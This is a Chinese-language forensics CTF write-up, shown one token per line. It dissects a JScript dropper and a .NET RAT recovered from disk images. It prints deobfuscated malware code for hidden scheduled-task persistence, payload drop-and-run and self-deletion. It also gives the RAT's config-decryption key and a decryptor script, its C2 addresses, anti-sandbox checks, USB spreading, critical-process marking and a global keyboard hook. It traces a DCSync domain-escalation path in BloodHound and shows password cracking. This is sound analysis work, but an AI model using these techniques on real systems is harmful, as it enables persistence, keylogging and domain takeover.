+(
+jlEi
+)
+{
+return
+parseInt
+(
+jlEi
+,
+16
+)
+;
+}
+// 创建计划任务（持久化）
+function
+eV_C
+(
+Bjmr
+,
+RT6x
+,
+O7Ec
+,
+YBwP
+,
+T9Px
+,
+egNr
+,
+rmGH
+)
+{
+try
+{
+var
+BGfI
+=
+WScript
+.
+CreateObject
+(
+"Schedule.Service"
+)
+;
+BGfI
+.
+Connect
+(
+)
+;
+var
+w2cQ
+=
+BGfI
+.
+GetFolder
+(
+"WPD"
+)
+;
+var
+xSm3
+=
+BGfI
+.
+NewTask
+(
+0
+)
+;
+xSm3
+.
+Principal
+.
+UserId
+=
+O7Ec
+;
+xSm3
+.
+Principal
+.
+LogonType
+=
+6
+;
+var
+wK2F
+=
+xSm3
+.
+RegistrationInfo
+;
+wK2F
+.
+Description
+=
+RT6x
+;
+wK2F
+.
+Author
+=
+O7Ec
+;
+var
+aYbx
+=
+xSm3
+.
+Settings
+;
+aYbx
+.
+Enabled
+=
+true
+;
+aYbx
+.
+StartWhenAvailable
+=
+true
+;
+aYbx
+.
+Hidden
+=
+rmGH
+;
+var
+oSP7
+=
+"2015-07-12T11:47:24"
+;
+var
+svaG
+=
+"2020-03-21T08:00:00"
+;
+var
+LDoN
+=
+xSm3
+.
+Triggers
+;
+var
+r9EC
+=
+LDoN
+.
+Create
+(
+9
+)
+;
+r9EC
+.
+StartBoundary
+=
+oSP7
+;
+r9EC
+.
+EndBoundary
+=
+svaG
+;
+r9EC
+.
+Id
+=
+"LogonTriggerId"
+;
+r9EC
+.
+UserId
+=
+O7Ec
+;
+r9EC
+.
+Enabled
+=
+true
+;
+var
+gQu9
+=
+xSm3
+.
+Actions
+.
+Create
+(
+0
+)
+;
+gQu9
+.
+Path
+=
+YBwP
+;
+gQu9
+.
+Arguments
+=
+T9Px
+;
+gQu9
+.
+WorkingDirectory
+=
+egNr
+;
+w2cQ
+.
+RegisterTaskDefinition
+(
+Bjmr
+,
+xSm3
+,
+6
+,
+""
+,
+""
+,
+3
+)
+;
+return
+true
+;
+}
+catch
+(
+Err
+)
+{
+return
+false
+;
+}
+}
+// 删除计划任务
+function
+KhDn
+(
+Bjmr
+)
+{
+try
+{
+var
+UGgw
+=
+false
+;
+var
+BGfI
+=
+WScript
+.
+CreateObject
+(
+"Schedule.Service"
+)
+;
+BGfI
+.
+Connect
+(
+)
+var
+w2cQ
+=
+BGfI
+.
+GetFolder
+(
+"WPD"
+)
+;
+var
+FLs6
+=
+w2cQ
+.
+GetTasks
+(
+0
+)
+;
+if
+(
+FLs6
+.
+count
+>=
+0
+)
+{
+var
+gk1H
+=
+new
+Enumerator
+(
+FLs6
+)
+;
+for
+(
+;
+!
+gk1H
+.
+atEnd
+(
+)
+;
+gk1H
+.
+moveNext
+(
+)
+)
+{
+if
+(
+gk1H
+.
+item
+(
+)
+.
+name
+==
+Bjmr
+)
+{
+w2cQ
+.
+DeleteTask
+(
+Bjmr
+,
+0
+)
+;
+UGgw
+=
+true
+;
+}
+}
+}
+}
+catch
+(
+Err
+)
+{
+return
+false
+;
+}
+}
+// 字符编码转换
+function
+cz_b
+(
+S3Ws
+)
+{
+var
+n9mV
+=
+[
+]
+;
+var
+mvAu
+=
+S3Ws
+.
+length
+;
+for
+(
+var
+i
+=
+0
+;
+i
+<
+mvAu
+;
+i
+++
+)
+{
+var
+wtVX
+=
+S3Ws
+.
+charCodeAt
+(
+i
+)
+;
+if
+(
+wtVX
+>=
+128
+)
+{
+var
+h
+=
+b92A
+[
+''
++
+RPbY
+(
+wtVX
+)
+]
+;
+wtVX
+=
+NptO
+(
+h
+)
+;
+}
+n9mV
+.
+push
+(
+wtVX
+)
+;
+}
+return
+n9mV
+;
+}
+// 写入文件
+function
+NoRS
+(
+ExY2
+,
+igeK
+)
+{
+var
+m3mH
+=
+WScript
+.
+CreateObject
+(
+"ADODB.Stream"
+)
+;
+m3mH
+.
+type
+=
+2
+;
+m3mH
+.
+Charset
+=
+"iso-8859-1"
+;
+m3mH
+.
+Open
+(
+)
+;
+m3mH
+.
+WriteText
+(
+ExY2
+)
+;
+m3mH
+.
+Flush
+(
+)
+;
+m3mH
+.
+Position
+=
+0
+;
+m3mH
+.
+SaveToFile
+(
+igeK
+,
+2
+)
+;
+m3mH
+.
+close
+(
+)
+;
+}
+// 获取临时目录
+function
+Blgx
+(
+gaWo
+)
+{
+wyKN
+=
+"c:\\Users\\"
++
+w5mY
++
+"\\AppData\\Local\\Microsoft\\Windows\\"
+;
+if
+(
+!
+QUjy
+.
+FOLDEREXISTS
+(
+wyKN
+)
+)
+wyKN
+=
+"c:\\Users\\"
++
+w5mY
++
+"\\AppData\\Local\\Temp\\"
+;
+if
+(
+!
+QUjy
+.
+FOLDEREXISTS
+(
+wyKN
+)
+)
+wyKN
+=
+"c:\\Documents and Settings\\"
++
+w5mY
++
+"\\Application Data\\Microsoft\\Windows\\"
+;
+return
+wyKN
+}
+// RC4 解密
+function
+FXx9
+(
+Z_3F
+,
+VMd7
+)
+{
+var
+NNSX
+=
+[
+]
+;
+var
+JDro
+=
+0
+;
+var
+KagY
+;
+var
+n9mV
+=
+''
+;
+for
+(
+var
+i
+=
+0
+;
+i
+<
+256
+;
+i
+++
+)
+{
+NNSX
+[
+i
+]
+=
+i
+;
+}
+for
+(
+var
+i
+=
+0
+;
+i
+<
+256
+;
+i
+++
+)
+{
+JDro
+=
+(
+JDro
++
+NNSX
+[
+i
+]
++
+Z_3F
+.
+charCodeAt
+(
+i
+%
+Z_3F
+.
+length
+)
+)
+%
+256
+;
+KagY
+=
+NNSX
+[
+i
+]
+;
+NNSX
+[
+i
+]
+=
+NNSX
+[
+JDro
+]
+;
+NNSX
+[
+JDro
+]
+=
+KagY
+;
+}
+var
+i
+=
+0
+;
+var
+JDro
+=
+0
+;
+for
+(
+var
+y
+=
+0
+;
+y
+<
+VMd7
+.
+length
+;
+y
+++
+)
+{
+i
+=
+(
+i
++
+1
+)
+%
+256
+;
+JDro
+=
+(
+JDro
++
+NNSX
+[
+i
+]
+)
+%
+256
+;
+KagY
+=
+NNSX
+[
+i
+]
+;
+NNSX
+[
+i
+]
+=
+NNSX
+[
+JDro
+]
+;
+NNSX
+[
+JDro
+]
+=
+KagY
+;
+n9mV
++=
+String
+.
+fromCharCode
+(
+VMd7
+[
+y
+]
+^
+NNSX
+[
+(
+NNSX
+[
+i
+]
++
+NNSX
+[
+JDro
+]
+)
+%
+256
+]
+)
+;
+}
+return
+n9mV
+;
+}
+判断点在
+XBL3()
+：
+var
+YIme
+=
+wyKN
++
+LIxF
+.
+substring
+(
+0
+,
+LIxF
+.
+length
+-
+2
+)
++
+"pif"
+;
+...
+NoRS
+(
+ptF0
+,
+YIme
+)
+;
+...
+c5ae
+(
+YIme
+,
+B_TG
+)
+;
+这里
+LIxF
+是当前脚本名，去掉最后两个字符
+js
+后再拼上
+pif
+，所以下载落地并执行的最终文件名会变成类似：
+maintools.pif
+后面
+c5ae()
+又直接
+Run
+这个
+YIme
+，所以最终执行的文件扩展名就是
+pif
+48.接上题，如果与C2通信失败，脚本会调用哪个函数尝试自毁并清理痕迹？【答案格式：Aabc】
+依据就在主循环
+jSm8()
+里：
+switch
+(
+f3cb
+)
+{
+case
+"good"
+:
+break
+;
+case
+"exit"
+:
+WScript
+.
+Quit
+(
+)
+;
+break
+;
+case
+"work"
+:
+XBL3
+(
+Ysyo
+)
+;
+break
+;
+case
+"fail"
+:
+tbMu
+(
+)
+;
+break
+;
+}
+也就是收到失败状态时，会调用
+tbMu()
+。而
+tbMu()
+里面确实在做自毁和清理：
+function
+tbMu
+(
+)
+{
+QUjy
+.
+DELETEFILE
+(
+WScript
+.
+SCRIPTFULLNAME
+)
+;
+eV_C
+(
+"TaskManager"
+,
+"Windows Task Manager"
+,
+w5mY
+,
+v_FileName
+,
+"EzZETcSXyKAdF_e5I2i1"
+,
+wyKN
+,
+false
+)
+;
+KhDn
+(
+"TaskManager"
+)
+;
+WScript
+.
+Quit
+(
+)
+;
+}
+这里包括删除当前脚本、处理计划任务、然后退出，所以答案就是：
+tbMu
+49.请分析早起王的PC镜像，该PC中neo4j数据库的密码是多少？【答案格式：abc3】
+文件名
+Intranet penetration
+内网渗透，考虑
+隐写，先试一下盲水印
+开机密码：1qazxsw2
+50.根据早起王笔录内容，早起王曾经对某企业进行过渗透攻击，请分析域内实体关系，FILESERVER.XIAORANG.LAB 对 XIAORANG.LAB 域拥有什么控制权限？【答案格式：ABCabc】
+挂载回容器外层
+启动neo4j和BloodHound
+PS
+Z:\neo4j-community-2025
+.
+02
+.
+0\bin>
+.
+\neo4j
+.
+bat console
+Directories in use:
+home:         Z:\neo4j-community-2025
+.
+02
+.
+0
+config:       Z:\neo4j-community-2025
+.
+02
+.
+0\conf
+logs:         Z:\neo4j-community-2025
+.
+02
+.
+0\logs
+plugins:      Z:\neo4j-community-2025
+.
+02
+.
+0\plugins
+import:       Z:\neo4j-community-2025
+.
+02
+.
+0\import
+data
+:         Z:\neo4j-community-2025
+.
+02
+.
+0\
+data
+certificates: Z:\neo4j-community-2025
+.
+02
+.
+0\certificates
+licenses:     Z:\neo4j-community-2025
+.
+02
+.
+0\licenses
+run:          Z:\neo4j-community-2025
+.
+02
+.
+0\run
+Starting Neo4j
+.
+2026-04-14 11:54:07
+.
+891+0000 INFO  Logging config in use: File
+'Z:\neo4j-community-2025.02.0\conf\user-logs.xml'
+2026-04-14 11:54:07
+.
+923+0000 INFO  Starting
+.
+.
+.
+2026-04-14 11:54:10
+.
+809+0000 INFO  This instance is ServerId
+{
+e2de2562
+}
+(
+e2de2562-5e2c-4092-96a8-178be201acbf
+)
+2026-04-14 11:54:13
+.
+180+0000 INFO  ======== Neo4j 2025
+.
+02
+.
+0 ========
+2026-04-14 11:54:17
+.
+251+0000 INFO  Anonymous Usage
+Data
+is being sent to Neo4j
+,
+see https:
+/
+/
+neo4j
+.
+com/docs/usage-
+data
+/
+2026-04-14 11:54:17
+.
+328+0000 INFO  Bolt enabled on localhost:7687
+.
+2026-04-14 11:54:18
+.
+503+0000 INFO  HTTP enabled on localhost:7474
+.
+2026-04-14 11:54:18
+.
+506+0000 INFO  Remote interface available at http:
+/
+/
+localhost:7474/
+2026-04-14 11:54:18
+.
+508+0000 INFO  id: 8685E9435CFF0F502B6D2FBDD20498A3F1910ABDBBA5B7A040121F81F2FFCA93
+2026-04-14 11:54:18
+.
+510+0000 INFO  name: system
+2026-04-14 11:54:18
+.
+511+0000 INFO  creationDate: 2026-03-29T04:33:35
+.
+259Z
+2026-04-14 11:54:18
+.
+511+0000 INFO  Started
+.
+账密：neoj4
+1qazxsw2
+啥也没有啊，要找 BloodHound 数据，还有早起王的u盘没用呢，找找有没有
+.dd
+一般是
+磁盘镜像文件
+，直接平航介质取证软件打开即可
+看到
+SharpHound-v1.1.1
+，
+20260407200233_BloodHound.zip
+导出来
+导入数据
+在 BloodHound 里找
+Upload Data / Import Data
+导入里面的
+json
+OK，已经能搜到了
+MATCH (c:Computer),(d:Domain)
+WHERE toUpper(c.name) = 'FILESERVER.XIAORANG.LAB'
+  AND toUpper(d.name) = 'XIAORANG.LAB'
+MATCH (c)-[r]->(d)
+RETURN type(r) AS rel;
+答案： DCSync
+51.根据早起王笔录内容，早起王在渗透过程中已成功控制ZHANGXIN@XIAORANG.LAB，请结合域内实体关系图分析，早起王获取域控权限的完整攻击轨迹是什么？【答案格式：XXXXXXXX@XXXXXXX.XXX->XXXXXXXXXX.XXXXXXX.XXX->XXXXXXXX.XXX】
+MATCH p=(u:User)-[*1..3]->(c:Computer)
+WHERE toUpper(u.name)='ZHANGXIN@XIAORANG.LAB'
+  AND toUpper(c.name)='FILESERVER.XIAORANG.LAB'
+RETURN p
+ZHANGXIN -> ACCOUNT OPERATORS
+是
+**MemberOf**
+意思：
+ZHANGXIN
+属于
+ACCOUNT OPERATORS
+ACCOUNT OPERATORS -> FILESERVER
+是
+**GenericAll**
+意思：
+ACCOUNT OPERATORS
+对
+FILESERVER
+有完全控制权限
+所以
+ZHANGXIN@XIAORANG.LAB -> ACCOUNT OPERATORS@XIAORANG.LAB -> FILESERVER.XIAORANG.LAB
+上题知：
+FILESERVER.XIAORANG.LAB -> XIAORANG.LAB
+具备的控制权限是
+**DCSync**
+【 本质是把“域控之间的正常数据复制能力”变成攻击者窃取域核心认证数据的入口 】
+判断链路是：
+ZHANGXIN@XIAORANG.LAB
+是
+ACCOUNT OPERATORS@XIAORANG.LAB
+成员
+ACCOUNT OPERATORS
+对
+FILESERVER.XIAORANG.LAB
+有
+GenericAll
+FILESERVER.XIAORANG.LAB
+对域
+XIAORANG.LAB
+有
+DCSync
+实际权限链：
+ZHANGXIN@XIAORANG.LAB -> ACCOUNT OPERATORS -> FILESERVER.XIAORANG.LAB -> DCSync -> XIAORANG.LAB
+但按题目提交格式，写三段就行：
+ZHANGXIN@XIAORANG.LAB->FILESERVER.XIAORANG.LAB->XIAORANG.LAB
+52.早起王在PC中记录过自己的犯罪动机并对其进行加密，请使用社工的方式破解加密文件，并提交密码。【答案格式：aabc3
+】**
+看他简历
+对应生成社工字典，用无影的Tscan
+用Passware Kit Forensic进行攻击【用法：
+https://blog.csdn.net/wow0524/article/details/131519669?ops_request_misc=elastic_search_misc&request_id=bcb3986103db6c3bcc21616a6cae1b30&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2
+all
+sobaiduend~default-1-131519669-null-null.142
+v102
+pc_search_result_base1&utm_term=passware%20kit%20forensic%E4%BD%BF%E7%94%A8&spm=1018.2226.3001.4187
+】
+先点底部
+**All**
+或手动把现有攻击清掉
+只新增一个
+**字典**
+Zqw20040101!
+倩倩
+检材：倩倩的PC镜像.E01；倩倩的PC内存.7z（DESKTOP-3943OKD-20260403-014746.dmp）
+53.早起王曾给倩倩发送过一封钓鱼邮件，请找到并计算附件MD5值【答案格式：字母不区分大小写】
+PS
+C:\Users\admin\AppData\Local\Netease\MailMaster\view\2\A1> certutil
+-
+hashfile Haimuniu_VPN_Client
+.
+zip MD5
+MD5 的 Haimuniu_VPN_Client
+.
+zip 哈希:
+5436b61ea58adb794804e3f18ce53f2a
+答案：5436b61ea58adb794804e3f18ce53f2a
+54.接上题，编译木马使用的.NET版本是多少？【答案格式：1.1.45141】
+4.0.30319
+55.接上题，木马中有多少反沙箱和反调试的检测逻辑？【答案格式：8】
+dnspy打开
+静态函数：
+8CBqemw89u44xYPchu85qRf8t1Kb7MrSwSSHdIK7O7VNarcvrvMnWLsldBYa
+(
+)
+这个就是主入口
+在入口里定位反分析总控函数：
+AuPSZXXVSMF0DQRCvC2rt5MfcrYC48o7KO1SI69og2JLhf02Th6Xma2HOysY
+(
+)
+这里一共串了 5 个检测函数
+，只要任意一个命中，就
+Environment.FailFast(null)
+直接退出
+Mi6spCUv...()
+看
+Win32_ComputerSystem
+：
+new
+ManagementObjectSearcher
+(
+"Select * from Win32_ComputerSystem"
+)
+里面检查：
+Manufacturer == "microsoft corporation"
+且
+Model
+包含
+VIRTUAL
+qemu
+VirtualBox
+这是
+虚拟机 / 沙箱环境检测
+ekfERkJz...()
+里面调用：
+CheckRemoteDebuggerPresent
+这是标准
+反调试
+2roByDJ...()
+里面调用：
+GetModuleHandle
+(
+"SbieDll.dll"
+)
+SbieDll.dll
+是
+Sandboxie
+特征模块。这是
+沙箱检测
+nIHJ1ssd...()
+里面检查：
+new
+ComputerInfo
+(
+)
+.
+OSFullName
+.
+ToLower
+(
+)
+.
+Contains
+(
+"xp"
+)
+这是把异常/老旧环境当成可疑环境，算
+环境检测
+pP3jQ2G5...()
+里面访问：
+http
+:
+/
+/
+ip
+-
+api
+.
+com
+/
+line
+/
+?
+fields
+=
+hosting
+然后判断返回值是否包含
+true
+。这是检测当前出口 IP 是否属于
+hosting / 机房 / 云环境
+，也算
+沙箱/分析环境检测
+56.接上题，木马为获得提升的权限执行而创建的计划任务名称是什么？【答案格式：Netlogon】
+在入口函数里有一段通过
+schtasks.exe
+创建计划任务的逻辑，关键代码是：
+processStartInfo
+.
+Arguments
+=
+string
+.
+Concat
+(
+new
+string
+[
+]
+{
+"/create /f /RL HIGHEST /sc minute /mo 1 /tn \""
+,
+Path
+.
+GetFileNameWithoutExtension
+(
+NB2
+..
+.
+EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu
+)
+,
+"\" /tr \""
+,
+text
+,
+"\""
+}
+)
+;
+这里的重点在
+/tn
+，它后面就是
+计划任务名称
+程序没有把任务名写死，而是用了：
+Path.GetFileNameWithoutExtension(...)
+也就是“
+落地文件名去掉扩展名
+”作为任务名
+密文常量
+：
+找解密函数
+分析一下（Ctrl+Shif+R）
+看到base64应该就是要找的
+解密算法入口
+先取密钥材料
+NB2
+..
+.
+DhMybcley
+..
+.
+这是
+全局配置里的密钥字符串
+把这个字符串转成字节
+ACX0
+..
+.
+wVkaAAeCf6BeWi8Flwtq
+(
+..
+.
+)
+大概率是
+string -> byte[]
+对它做 MD5
+md5CryptoServiceProvider
+.
+ComputeHash
+(
+..
+.
+)
+得到 16 字节 md5
+拼 32 字节 Rijndael Key
+Array
+.
+Copy
+(
+sourceArray
+,
+0
+,
+array
+,
+0
+,
+16
+)
+;
+Array
+.
+Copy
+(
+sourceArray
+,
+0
+,
+array
+,
+15
+,
+16
+)
+;
+也就是把同一个 MD5 结果复制两次到 32 字节 key 里。注意第二次是从偏移
+15
+开始，不是 16，这说明它的 key 拼接有个
+重叠 1 字节
+的特征
+模式
+rijndaelManaged
+.
+Mode
+=
+2
+;
+在 .NET 里
+2
+对应
+ECB
+真正解密密文
+byte
+[
+]
+array2
+=
+Convert
+.
+FromBase64String
+(
+ciphertext
+)
+;
+cryptoTransform
+.
+TransformFinalBlock
+(
+array2
+,
+0
+,
+array2
+.
+Length
+)
+先 base64 解码密文， 再用上面的 Rijndael Key 解密
+最后转回字符串
+ACX0
+..
+.
+sJljw7gGxcYB8jRe1fPv
+(
+..
+.
+)
+大概率是
+byte[] -> string
+秘钥key：
+看两个 helper函数：
+ACX0qTJzEzq40qP5qFxb
+.
+wVkaAAeCf6BeWi8Flwtq
+ACX0qTJzEzq40qP5qFxb
+.
+sJljw7gGxcYB8jRe1fPv
+解密逻辑：
+string
+DecryptConfig
+(
+string
+ciphertext
+)
+{
+// 1) 取固定 key 字符串
+string
+keyStr
+=
+"8xTJ0EKPuiQsJVaT"
+;
+// 2) UTF8 转字节
+byte
+[
+]
+keyBytes
+=
+Encoding
+.
+UTF8
+.
+GetBytes
+(
+keyStr
+)
+;
+// 3) MD5
+byte
+[
+]
+md5
+=
+MD5
+.
+Create
+(
+)
+.
+ComputeHash
+(
+keyBytes
+)
+;
+// 16 bytes
+// 4) 构造 32-byte Rijndael key
+byte
+[
+]
+key
+=
+new
+byte
+[
+32
+]
+;
+Array
+.
+Copy
+(
+md5
+,
+0
+,
+key
+,
+0
+,
+16
+)
+;
+Array
+.
+Copy
+(
+md5
+,
+0
+,
+key
+,
+15
+,
+16
+)
+;
+// 注意这里从 15 开始复制
+// 5) Rijndael / ECB
+using
+var
+rij
+=
+new
+RijndaelManaged
+(
+)
+;
+rij
+.
+Key
+=
+key
+;
+rij
+.
+Mode
+=
+CipherMode
+.
+ECB
+;
+// 6) base64 解码后解密
+byte
+[
+]
+enc
+=
+Convert
+.
+FromBase64String
+(
+ciphertext
+)
+;
+byte
+[
+]
+dec
+=
+rij
+.
+CreateDecryptor
+(
+)
+.
+TransformFinalBlock
+(
+enc
+,
+0
+,
+enc
+.
+Length
+)
+;
+// 7) UTF8 转字符串
+return
+Encoding
+.
+UTF8
+.
+GetString
+(
+dec
+)
+;
+}
+MD5要补0成32位
+脚本
+import
+base64
+import
+hashlib
+from
+Crypto
+.
+Cipher
+import
+AES
+
+seed
+=
+"8xTJ0EKPuiQsJVaT"
+cipher_b64
+=
+"sJHKF5x7kjxy85oLMym05A=="
+md5
+=
+hashlib
+.
+md5
+(
+seed
+.
+encode
+(
+)
+)
+.
+digest
+(
+)
+key
+=
+bytearray
+(
+32
+)
+key
+[
+0
+:
+16
+]
+=
+md5
+key
+[
+15
+:
+31
+]
+=
+md5
+# 按样本代码，从 15 开始拷贝
+cipher
+=
+AES
+.
+new
+(
+bytes
+(
+key
+)
+,
+AES
+.
+MODE_ECB
+)
+pt
+=
+cipher
+.
+decrypt
+(
+base64
+.
+b64decode
+(
+cipher_b64
+)
+)
+print
+(
+pt
+.
+decode
+(
+)
+)
+WmiPrvSE
+57.
+接上题，木马使用哪种加密算法来加密或混淆其配置数据？（答案格式：BASE64）
+代码里用的是
+RijndaelManaged
+，严格名称叫 Rijndael；但这段参数配置下，实际可以按
+AES-256-ECB
+理解
+答案：AES
+58.接上题，为了获取其加密算法的某个参数，木马使用一个硬编码字符串作为输入，这个硬编码字符串的值是多少？【答案格式:uwbf4wNfw】
+8xTJ0EKPuiQsJVaT
+59.接上题，木马回连的ip地址有哪些？【答案格式:按照木马中原始的顺序写入,答案用,隔开,格式;114.114.114.114,8.8.8.8,1.1.1.1】
+把这些全代入上面的脚本
+import
+base64
+import
+hashlib
+from
+Crypto
+.
+Cipher
+import
+AES
+
+seed
+=
+"8xTJ0EKPuiQsJVaT"
+cipher_b64
+=
+[
+"b7lP9DKXK17yU4FBIMvdZYYT7q1ogMGVrgjUqWnzqLxMXw3GIeVZpids5gIz2YZu"
+,
+"3qBjH4yDUHjhZBxWK56eYw=="
+,
+"P/4B29PWaJ6Raw+51xox2A=="
+,
+"fwWlqX1XMU7EFmHRUHk3Jw=="
+,
+"TowG+c1OR3RBmATvJwUFKQ=="
+,
+"lXEVYeoDw31nYYF2ts9aUQ=="
+,
+"gcbmRCfQRwasaegNU1/NvQ=="
+,
+"sJHKF5x7kjxy85oLMym05A=="
+,
+"llBblX1iqHd1zfZIV8Z0jL3MzbCo6zP7QWx7R9nEvuQbIA25kxWNjjY8WYEY+Xh1"
+,
+"ILq1reLnyJdhfez8kYLyBYJr+EjguBMQ6n4dPjgAia6wJGxs5SWbzuMPh1LUk/Ig"
+,
+"6I60HSsPViAp3nyv1OYEEQ=="
+,
+]
+md5
+=
+hashlib
+.
+md5
+(
+seed
+.
+encode
+(
+)
+)
+.
+digest
+(
+)
+key
+=
+bytearray
+(
+32
+)
+key
+[
+0
+:
+16
+]
+=
+md5
+key
+[
+15
+:
+31
+]
+=
+md5
+# 按样本代码，从 15 开始拷贝
+cipher
+=
+AES
+.
+new
+(
+bytes
+(
+key
+)
+,
+AES
+.
+MODE_ECB
+)
+for
+b64_str
+in
+cipher_b64
+:
+pt
+=
+cipher
+.
+decrypt
+(
+base64
+.
+b64decode
+(
+b64_str
+)
+)
+print
+(
+pt
+.
+decode
+(
+)
+)
+b7lP9DKXK17yU4FBIMvdZYYT7q1ogMGVrgjUqWnzqLxMXw3GIeVZpids5gIz2YZu 对应的内容为
+156.238.239.253,66.175.239.149,185.117.249.43
+60.
+接上题，木马回连的C2通信端口是多少？（答案格式：11451）
+7000
+61.接上题，该木马通过将自身复制到可移动设备上来传播，在每个受感染设备上创建的新副本的名称是什么？【答案格式:dwm.exe】
+U盘传播主逻辑在
+Stub.VRti6vhPYugo9GdL3aQYj2eDRdhSfKIazXyfNr18qkYGBHO0iTkiZoRtMwtI7vEZAaW8tYfk5m7J2 :8JW8sctA
+WP3goappjN57CJl2TLWyKcTw2ZYwj5rr18XOfs8ItKA8LpXmObthOBfOKEBBELi8RAE3J()
+USB.exe
+62.接上题，木马用来检测其是否在沙盒环境中运行的DLL的名称是什么？【答案格式:v50.dll】
+55题，SbieDll.dll
+63. 接上题，木马操纵的用于控制Windows资源管理器中隐藏项目可见性的注册表项名称是什么？【答案格式:AAAabe3】
+https://wenku.csdn.net/doc/6n839s3ojq?ops_request_misc=elastic_search_misc&request_id=6efa3773ca22ad6a3beb42452790329f&biz_id=&utm_medium=distribute.pc_search_result.none-task-c_download-2
+all
+ElasticSearch~search_v2-3-6n839s3ojq-null-null.142
+v102
+pc_search_result_base1&utm_term=%E6%9C%A8%E9%A9%AC%E6%93%8D%E7%BA%B5%E7%9A%84%E7%94%A8%E4%BA%8E%E6%8E%A7%E5%88%B6Windows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E4%B8%AD%E9%9A%90%E8%97%8F%E9%A1%B9%E7%9B%AE%E5%8F%AF%E8%A7%81%E6%80%A7%E7%9A%84%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9%E5%90%8D%E7%A7%B0&spm=1018.2226.3001.4187
+文中说位置在HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+在 USB 传播模块中，木马修改注册表：
+方法
+Stub.VRti6vhPYugo9GdL3aQYj2eDRdhSfKIazXyfNr18qkYGBHO0iTkiZoRtMwtI7vEZAaW8tYfk5m7J2 :8JW8sctA
+WP3goappjN57CJl2TLWyKcTw2ZYwj5rr18XOfs8ItKA8LpXmObthOBfOKEBBELi8RAE3J()
+样本通过访问注册表路径
+HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+，并读取/修改其中的
+ShowSuperHidden
+值为0，以控制 Windows 资源管理器中隐藏项目的显示行为 答案：ShowSuperHidden
+64. 接上题，木马使用哪个API将其进程标记为关键进程？【答案格式:WNetAddConnection】
+木马把自己变成“关键进程”，常见就两种写法：
+直接调
+RtlSetProcessIsCritical
+间接调
+NtSetInformationProcess(ProcessBreakOnTermination, ...)
+全局搜
+实际导入的 DLL：
+NTdll.dll
+实际调用的 API：
+RtlSetProcessIsCritical
+H8daqEsgsEVBpFZFnlWT
+只是它混淆后的
+本地包装函数名
+这里传参：
+H8daqEsgsEVBpFZFnlWT
+(
+true
+,
+ref
+flag
+,
+false
+)
+;
+说明程序在运行时实际调用了
+RtlSetProcessIsCritical
+，将当前进程标记为关键进程
+答案：
+RtlSetProcessIsCritical
+65.接上题，木马使用哪个API来捕获用户输入？【答案格式:WNetAddConnection】
+先找所有外部导入 API
+在 dnSpy 里，全局搜这些关键词：
+DllImport
+user32.dll
+kernel32.dll
+ntdll.dll
+木马如果调用 Windows API，C# 里大多会长这样：
+[
+DllImport
+(
+"user32.dll"
+,
+EntryPoint
+=
+"GetLastInputInfo"
+)
+]
+public
+static
+extern
+bool
+R5vgx29clErevmbzwNfR
+(
+ref
+ACX0qTJzEzq40qP5qFxb
+.
+LASTINPUTINFO
+Mofkl6aN9vA0bPXY5XIo
+)
+;
+也就是说，
+真正的 API 名往往直接躺在
+**DllImport**
+的
+**EntryPoint**
+里
+，哪怕函数名本地已经被混淆了
+优先搜输入捕获相关 API 名
+出现过：
+GetForegroundWindow
+GetWindowText
+这就说明样本里
+确实存在输入/窗口上下文记录的倾向
+，这会往 keylogger 方向引
+可以搜这些
+SetWindowsHookEx
+CallNextHookEx
+UnhookWindowsHookEx
+GetAsyncKeyState
+GetKeyState
+GetForegroundWindow
+GetWindowText
+进到
+键盘钩子类
+了 ，但还不足以说明，看一下这个类：
+实际安装了 Hook
+public
+static
+void
+JKx38cy8TbFy5P5ttrQ9OLrthXtu96odVBXsmvxSn20Mt8RNga1E4WcryC9xOrWhaWouoY8gKqapQ
+(
+)
+{
+T5ohLdZOIkU5OcJb1OhB
+=
+gbCd08rDfseGE3J0T9qVznuYeUvu0XNOFrPRHHHyWzDcQnAO1CcV8WSyatgkEErKTJu2YcRFpwveF
+(
+s87uDCuNDkFL2iQ0tcXL
+)
+;
+Application
+.
+Run
+(
+)
+;
+}
+private
+static
+IntPtr
+gbCd08rDfseGE3J0T9qVznuYeUvu0XNOFrPRHHHyWzDcQnAO1CcV8WSyatgkEErKTJu2YcRFpwveF
+(
+LowLevelKeyboardProc
+cb
+)
+{
+using
+(
+Process
+currentProcess
+=
+Process
+.
+GetCurrentProcess
+(
+)
+)
+{
+return
+v2H7UaTp8QLeiqSYflzi3sclFElatUojEHCwvOIoXHXii3FlZocIVLQx9c8vO5vW9iL6KiRzIfUyn
+(
+qngu7xoZGGhpg5AVMmig
+,
+cb
+,
+RSAhvLEO2fyXUqWFA6aJ
+(
+currentProcess
+.
+ProcessName
+)
+,
+0U
+)
+;
+}
+}
+这里先把返回的 Hook 句柄保存到
+T5ohLdZO...
+，然后调用
+Application.Run()
+保持消息循环，说明样本不是“导入了 API 但没用”，而是
+真的安装了一个全局 Hook 并常驻运行
+这个 Hook 对应的就是
+SetWindowsHookEx
+[
+DllImport
+(
+"user32.dll"
+,
+CharSet
+=
+CharSet
+.
+Auto
+,
+EntryPoint
+=
+"SetWindowsHookEx"
+,
+SetLastError
+=
+true
+)
+]
+private
+static
+extern
+IntPtr
+v2H7UaTp8QLeiqSYflzi3sclFElatUojEHCwvOIoXHXii3FlZocIVLQx9c8vO5vW9iL6KiRzIfUyn
+(
+int
+idHook
+,
+LowLevelKeyboardProc
+lpfn
+,
+IntPtr
+hMod
+,
+uint
+dwThreadId
+)
+;
+[
+DllImport
+(
+"user32.dll"
+,
+CharSet
+=
+CharSet
+.
+Auto
+,
+EntryPoint
+=
+"CallNextHookEx"
+,
+SetLastError
+=
+true
+)
+]
+private
+static
+extern
+IntPtr
+B4qKxfck2L7xA8QlrpiC
+(
+..
+.
+)
+;
+[
+DllImport
+(
+"user32.dll"
+,
+CharSet
+=
+CharSet
+.
+Auto
+,
+EntryPoint
+=
+"UnhookWindowsHookEx"
+,
+SetLastError
+=
+true
+)
+]
+private
+static
+extern
+bool
+APdkp7NR04594a8EiuKc
+(
+..
+.
+)
+;
+这里已经能看到一整套 Hook API：
+SetWindowsHookEx
+CallNextHookEx
+UnhookWindowsHookEx
+这说明样本实现的是标准的 Windows Hook 机制，而不是别的输入采集方式
